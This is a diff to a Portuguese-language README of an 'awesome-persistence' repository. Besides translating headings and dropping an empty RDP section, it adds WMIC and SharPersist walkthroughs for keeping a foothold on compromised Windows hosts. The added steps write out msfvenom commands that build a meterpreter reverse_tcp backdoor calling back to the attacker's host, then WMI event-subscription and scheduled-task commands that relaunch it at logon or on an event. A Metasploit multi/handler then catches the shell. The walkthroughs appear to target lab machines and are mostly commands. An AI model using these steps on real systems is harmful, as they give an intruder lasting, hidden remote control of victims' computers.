@@ -12,7 +12,6 @@ Eu sou o Stux e estarei constantemente atualizando este repositório com novas t
  - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
  - [Persistence Registry](https://github.com/Stuuxx/awesome-persistence#persistence-registry)
  - [Netcat](https://github.com/Stuuxx/awesome-persistence#netcat)
- - [RDP](https://github.com/Stuuxx/awesome-persistence#rdp)
  - [Schtasks](https://github.com/Stuuxx/awesome-persistence#schtasks)
  - [Schtasks-Log Events](https://github.com/Stuuxx/awesome-persistence#schtasks---log-events)
  - [WMIC]()
@@ -22,7 +21,7 @@ Eu sou o Stux e estarei constantemente atualizando este repositório com novas t
 
 ## Persistence Service
 
-Overview:
+Introdução:
 
 Essa técnica tem como objetivo criar um serviço persistente no windows explorado na qual executará diversas vezes o payload de conexão reversa.
 
@@ -62,7 +61,7 @@ Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a 
 
 ## Persistence Registry
 
-Overview:
+Introdução:
 
 Etapas:
 
@@ -72,7 +71,7 @@ Etapas:
 
 ## Netcat
 
-Overview:
+Introdução:
 
 Nessa técnica, iremos realizar o upload do netcat para o alvo e iremos modificar um registro para que o alvo execute ele, nos abrindo uma porta para conectar posteriormente quando necessário.
 
@@ -107,22 +106,9 @@ nc IP PORTA
 
 
 
-
-
-## RDP
-
-Overview: 
-
-
-Etapas:
-
-
-
-
-
 ## Schtasks
 
-Overview:
+Introdução:
 
 Nessa técnica, iremos utilizar como backdoor o módulo do metasploit chamado "Script Web Delivery". Este módulo aciona rapidamente um servidor web que serve uma carga útil. O módulo fornecerá um comando a ser executado na máquina de destino com base no destino selecionado. O comando fornecido baixará e executará uma carga útil usando um interpretador de linguagem de script especificado ou "squablydoo" via regsvr32.exe para ignorar a lista de permissões do aplicativo. Usaremos o link gerado para criar uma tarefa que acionará o link malicioso toda vez que o login do usuário no sistema for realizado.
 
@@ -164,7 +150,7 @@ Para prova de conceito, iremos dar um reboot na máquina explorada para que noss
 
 ## Schtasks - Log Events
 
-Overview:
+Introdução:
 
 Nesse caso, estamos criando uma tarefa que pode ser acionada em um log de segurança específico do Windows event. Ou seja, ID do event: 4634 (4634: event desconectado de uma conta). Quando um usuário faz logoff, então este event é gerado. Portanto, a tarefa agendada é executada assim que o usuário fizer login novamente.
 
@@ -206,17 +192,71 @@ Para prova de conceito, iremos dar um reboot na máquina explorada para que noss
 
 ## WMIC
 
-Overview:
+Introdução:
+
+Utilizaremos o WMIC do Windows para criar uma instância "EventFilter" e uma "EventConsumer" com a classe "CommandLineEventConsumer" para executar nosso backdoor de forma contínua e no final registraremos o evento de forma permanente.
 
 Etapas:
 
+- Iniciaremos criando o nosso backdoor através do msfvenom.
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
+```
+![Screenshot_1](https://user-images.githubusercontent.com/67444297/198846885-92bb566d-63f2-4a50-9c3f-48a7af5e341f.jpg)
 
+- Logo após, no meterpreter, iremos realizar o upload do backdoor.exe para um diretório temporário.
 
+![Screenshot_2](https://user-images.githubusercontent.com/67444297/198846887-2dc82c3c-d42a-4ccb-97c1-8e1104fc346c.jpg)
 
+- E então chegou o momento de criarmos as instâncias através do wmic, no meterpreter, iniciaremos a shell e então iniciaremos o processo.
+```bash
+shell
+```
+
+- Criar a instância EventFilter.
+
+```bash
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="AttackDefense", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+```
+
+- Criar a instância EventConsumer e usar a classe CommandLineEventConsumer.
+
+```bash
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="AttackDefense", ExecutablePath="C:\Users\Administrator\AppData\Local\Temp\backdoor.exe",CommandLineTemplate="C:\Windows\system32\backdoor.exe"
+```
+
+- Registrar o evento permanentemente.
+
+```bash
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"AttackDefense\"", Consumer="CommandLineEventConsumer.Name=\"AttackDefense\""
+```
+![Screenshot_3](https://user-images.githubusercontent.com/67444297/198846888-d97bc179-1486-402a-805e-d43d2b907fff.jpg)
+
+- Logo após a configuração do evento de persistência, iremos iniciar o multi/handler.
+
+```bash
+msfconsole -q
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+ip a s
+set LHOST SEUIP
+exploit
+```
+![Screenshot_4](https://user-images.githubusercontent.com/67444297/198846891-f42798d1-97ed-45f9-a44c-6da7973fde57.jpg)
+
+Para prova de conceito, iremos dar um reboot na máquina explorada para receber a shell no multi/handler.
+
+![Screenshot_6](https://user-images.githubusercontent.com/67444297/198846894-ee1c6ad0-7628-42b0-8d53-299bf1cc407c.jpg)
+
+- Após o reboot, podemos visualizar a shell em nosso multi/handler.
+
+![Screenshot_5](https://user-images.githubusercontent.com/67444297/198846893-5c177855-04cd-4c0f-8db1-05748817994a.jpg)
 
 ## Wmi-Persistence
 
-Overview:
+Introdução:
+
 O script WMI-Persistence serve para criar assinaturas de eventos WMI maliciosas, através do upload desse script powershell para a máquina explorada, iremos realizar o processo de persistência.
 
 Para realizar o download do WMI-Persistence.ps1 [clique aqui.](https://github.com/subesp0x10/Wmi-Persistence)
@@ -270,13 +310,46 @@ Para prova de conceito, iremos dar um reboot na máquina explorada para receberm
 
 ## SharPersist
 
-Overview:
+Introdução:
+
+SharPersist é um kit de ferramentas de persistência do Windows escrito em C#. Suporta toneladas de técnicas diferentes para manutenção de persistência.
 
 Etapas:
+- Vamos iniciar criando um backdoor através do msfvenom.
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
+```
+![Screenshot_1](https://user-images.githubusercontent.com/67444297/198844773-73f18f85-cfb4-4020-92c5-ef1b493bad7e.jpg)
 
+- No meterpreter, vamos realizar o upload do backdoor e do SharPersist.exe para um diretório temporário.
 
+![Screenshot_2](https://user-images.githubusercontent.com/67444297/198844774-bb86e4fa-91ef-43ee-aa3b-18f74bbb26fc.jpg)
 
+- Agora iremos carregar a extensão do powershell e iremos criar uma tarefa agendada através do SharPersist.exe.
+```bash
+load powershell
+powershell_shell
+./SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c \Users\Administrator\AppData\Local\Temp\backdoor.exe" -n "AttackDefense" -m add -o logon
+```
+![Screenshot_3](https://user-images.githubusercontent.com/67444297/198844776-d98a0b32-2db7-428c-9c27-d4756538bce0.jpg)
 
+- Em outra aba, iniciaremos o multi/handler para receber a shell.
+```bash
+msfconsole -q
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST SEUIP
+set LPORT 4444
+exploit
+```
+![Screenshot_4](https://user-images.githubusercontent.com/67444297/198844778-e39d9d12-9de7-4766-9c1b-ec9137305a60.jpg)
+
+Para prova de conceito, iremos dar um reboot na máquina explorada para recebermos nossa shell no multi/handler.
+
+![Screenshot_5](https://user-images.githubusercontent.com/67444297/198844924-f62b40dc-e902-44a4-be9f-3ac0b1722686.jpg)
+
+- E então, recebemos nossa shell no multi/handler.
+
+![Screenshot_6](https://user-images.githubusercontent.com/67444297/198844780-e2b39e76-1f5c-4957-9ae2-bf44a1b0e8bc.jpg)
 
 ## Ficou com alguma dúvida?
 Sinta-se a vontade para entrar em contato comigo através de minhas redes sociais!
